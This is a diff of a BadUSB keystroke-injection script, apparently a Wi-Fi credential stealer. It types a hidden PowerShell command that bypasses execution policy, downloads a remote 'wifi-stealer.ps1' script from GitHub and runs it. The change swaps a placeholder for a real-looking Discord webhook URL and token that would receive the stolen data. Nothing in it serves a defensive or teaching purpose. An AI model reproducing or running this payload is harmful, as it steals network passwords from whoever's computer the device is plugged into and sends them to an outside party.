@@ -3,5 +3,5 @@ REM Credits to beigeworm
 REM Time to execute: 7.6
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/wifi-stealer/wifi-stealer.ps1 | iex
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1192597743110205500/jfeDDQTMipzxNGiVoiY9CmfTYuxpPrArhbtx4rePSer_mnVn-zcphbpFpC_2CToul2XA';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/wifi-stealer/wifi-stealer.ps1 | iex
 ENTER
